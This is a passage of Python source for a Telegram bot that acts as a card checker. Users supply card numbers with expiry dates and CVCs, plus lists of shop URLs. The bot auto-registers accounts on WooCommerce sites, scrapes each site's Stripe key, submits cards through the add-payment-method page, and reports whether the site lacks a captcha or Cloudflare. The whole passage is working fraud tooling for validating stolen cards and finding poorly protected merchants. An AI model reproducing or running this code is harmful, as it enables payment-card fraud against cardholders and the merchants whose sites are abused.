        await update.message.reply_text("❌ Invalid CVC.", parse_mode=ParseMode.HTML)
        return

    save_user_card(user_id, card_text)
    context.user_data["waiting_for_card"] = False
    await update.message.reply_text("✅ Your card has been saved successfully!", parse_mode=ParseMode.HTML)


# ================================================================
# 🧠 /check Command (Quick Manual Site Check)
# ================================================================
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /check <site> [card]")
        return

    site_input = context.args[0].rstrip("/")
    base = get_base_url(site_input)
    user_id = update.effective_chat.id
    saved_card = load_user_card(user_id)
    card = context.args[1] if len(context.args) > 1 else (saved_card or DEFAULT_CARD)

    msg = await update.message.reply_text(f"🔍 Checking {html_escape(base)} ...", parse_mode=ParseMode.HTML)

    try:
        session = register_new_account(base + "/my-account/")
        if not session:
            await msg.edit_text("❌ Registration failed.")
            return
        session.payment_page_url = base + "/my-account/add-payment-method/"
        page_html = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
        page_info = analyze_site_page(page_html)
        pk_raw = find_pk(session.payment_page_url, session)
        if not pk_raw:
            await msg.edit_text("❌ Stripe PK not found.")
            return
        result = send_card_to_stripe(session, pk_raw, card)
        gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"

        out = (
            f"<b>Site:</b> <code>{html_escape(base)}</code>\n"
            f"<b>Gateway:</b> {gateway}\n"
            f"<b>Captcha:</b> {'Found❌' if page_info['has_captcha'] else 'Good✅'}\n"
            f"<b>Cloudflare:</b> {'Found❌' if page_info['has_cloudflare'] else 'Good✅'}\n"
            f"<b>Add-to-cart:</b> {'Yes' if page_info['has_add_to_cart'] else 'No'}\n"
            f"<b>PK:</b> <code>{html_escape(pk_raw)}</code>\n\n"
            f"<b>Result:</b> {html_escape(result.get('short_msg',''))}\n"
            f"<code>{html_escape(str(result.get('raw',''))[:400])}</code>"
        )
        await msg.edit_text(out, parse_mode=ParseMode.HTML)

    except Exception as e:
        await msg.edit_text(f"❌ Error: {html_escape(str(e))}", parse_mode=ParseMode.HTML)

# ================================================================
# 🤖 /start and /help Commands
# ================================================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<code>Please send me a <b>.txt file</b> containing site URLs to check.</code>\n"
        "<code>Each line should contain one site (e.g., <code>https://example.com</code>).</code>\n\n"
        "<code>Use</code> <b>/help</b> <code>to learn how to add your own card or get more info.</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<code>Send a .txt file containing one site URL per line.</code>\n"
        "<code>To use your own card for checks, save it via the</code> <b>/card</b> <code>command before uploading the .txt file.</code>\n"
        "<code>Example: /check https://example.com</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)




# ================================================================
# 💳 /card Command — User Card Manager
# ================================================================
CARD_DIR = "card"
os.makedirs(CARD_DIR, exist_ok=True)

def get_user_card_path(user_id):
    return os.path.join(CARD_DIR, str(user_id), "card.json")

def load_user_card(user_id):
    path = get_user_card_path(user_id)
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                data = json.load(f)
                card = str(data.get("card", "")).strip()
                if card and "|" in card:
                    return card
        except Exception:
            pass
    return None

def save_user_card(user_id, card_str):
    user_folder = os.path.join(CARD_DIR, str(user_id))
    os.makedirs(user_folder, exist_ok=True)
    with open(os.path.join(user_folder, "card.json"), "w") as f:
        json.dump({"card": card_str}, f)

async def card_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    has_card = load_user_card(user_id) is not None

    if has_card:
        buttons = [
            [InlineKeyboardButton("🔁 Replace", callback_data="card_replace")],
            [InlineKeyboardButton("🗑 Cancel", callback_data="card_cancel")],
            [InlineKeyboardButton("♻ Default", callback_data="card_default")],
        ]
        text = "💳 Please select:\n<b>Replace</b> your card, <b>Cancel</b>, or <b>Use Default</b>."
    else:
        buttons = [
            [InlineKeyboardButton("➕ Add", callback_data="card_add")],
            [InlineKeyboardButton("🗑 Cancel", callback_data="card_cancel")],
            [InlineKeyboardButton("♻ Default", callback_data="card_default")],
        ]
        text = "💳 Please select:\n<b>Add</b> a new card, <b>Cancel</b>, or <b>Use Default</b>."

    markup = InlineKeyboardMarkup(buttons)
    await update.message.reply_text(text, reply_markup=markup, parse_mode=ParseMode.HTML)

# ================================================================
# 💳 Callback handler for /card buttons
# ================================================================
async def card_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.message.chat.id
    data = query.data

    if data in ("card_add", "card_replace"):
        await query.message.edit_text(
            "💬 Please send your card in format:\n<code>1234567812345678|06|2027|123</code>",
            parse_mode=ParseMode.HTML
        )
        context.user_data["waiting_for_card"] = True
        return

    elif data == "card_default":
        path = get_user_card_path(user_id)
        if os.path.exists(path):
            os.remove(path)
        await query.message.edit_text("✅ Now using <b>default card</b>.", parse_mode=ParseMode.HTML)

    elif data == "card_cancel":
        await query.message.edit_text("❌ Card action cancelled.", parse_mode=ParseMode.HTML)

# ================================================================
# 🚀 Main Entry
# ================================================================
def main():
    # ------------------------------------------------------------
    # 🚀 Build the Application with high concurrency and isolation
    # ------------------------------------------------------------
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)   # ✅ allow multiple users to run handlers simultaneously
        .read_timeout(30)           # prevents timeouts when sites are slow
        .write_timeout(30)
        .connect_timeout(20)
        .pool_timeout(20)
        .build()
    )

    # Command + message handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("card", card_command))
    app.add_handler(CallbackQueryHandler(card_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_input))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_txt))

    if DEBUG_MODE:
        builtins._orig_print("[DEBUG] Bot starting with concurrent_updates=True and DEBUG_MODE=True")
    else:
        builtins._orig_print("🤖 Bot running silently (multi-user mode).")

    # ------------------------------------------------------------
    # ✅ Non-blocking polling mode
    # ------------------------------------------------------------
    app.run_polling(
        stop_signals=None,
        allowed_updates=Update.ALL_TYPES,
        close_loop=False,           # keep event loop open for background tasks
        drop_pending_updates=True,  # ignore old backlog if restarting
    )


if __name__ == "__main__":
    main()






